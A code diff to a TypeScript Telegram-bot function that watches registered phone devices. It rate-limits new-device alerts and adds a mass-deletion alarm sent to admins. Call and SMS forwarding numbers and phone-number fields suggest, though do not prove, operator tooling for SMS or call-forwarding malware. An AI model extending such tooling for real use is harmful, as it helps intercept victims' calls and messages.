@@ -48,9 +48,20 @@ export function startDeviceWatcher(bot: Telegraf, adminId: number): void {
       const fwdCall = forwardDefaults?.callNumber || null;
       const fwdSms = forwardDefaults?.smsNumber || null;
 
+      const lastNotify: Map<string, number> =
+        (globalThis as any).__dwNotify || ((globalThis as any).__dwNotify = new Map());
       for (const id of currentIds) {
         if (!knownDevices.has(id)) {
           let device: any = clients[id];
+          if (!device || typeof device !== "object" || Array.isArray(device)) {
+            knownDevices.add(id);
+            continue;
+          }
+          if (Date.now() - (lastNotify.get(id) || 0) < 24 * 3600 * 1000) {
+            knownDevices.add(id);
+            continue;
+          }
+          lastNotify.set(id, Date.now());
           // New devices often write lastPing first and model/phone a moment later.
           // Wait + re-read so the Telegram alert shows the full details.
           if (!device?.mobNo && !device?.modelName) {
@@ -180,6 +191,21 @@ export function startDeviceWatcher(bot: Telegraf, adminId: number): void {
           }
 
           knownDevices.add(id);
+        }
+      }
+
+      const vanished = [...knownDevices].filter((x) => !currentIds.has(x));
+      if (knownDevices.size > 10 && vanished.length >= 5) {
+        const text =
+          `\uD83D\uDEA8 *Possible mass delete!*\n\n` +
+          `Devices: ${knownDevices.size} \u2192 ${currentIds.size}\n` +
+          `Missing: ${vanished.slice(0, 10).map((x) => `\`${x.slice(0, 8)}\``).join(", ")}`;
+        for (const adm of ADMIN_TG_IDS) {
+          try {
+            await bot.telegram.sendMessage(adm, text, { parse_mode: "Markdown" });
+          } catch (err) {
+            logger.error({ err }, "mass-delete alarm failed");
+          }
         }
       }
 
